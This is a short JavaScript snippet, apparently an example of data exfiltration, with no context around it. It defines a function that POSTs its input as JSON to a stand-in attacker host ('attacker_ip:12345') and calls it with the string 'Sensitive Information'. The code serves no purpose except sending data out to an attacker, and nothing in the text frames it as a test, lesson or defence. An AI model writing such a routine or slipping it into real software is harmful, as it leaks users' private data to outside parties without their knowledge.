function sendData(data) {
    fetch('http://attacker_ip:12345', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: data })
    });
}

sendData('Sensitive Information');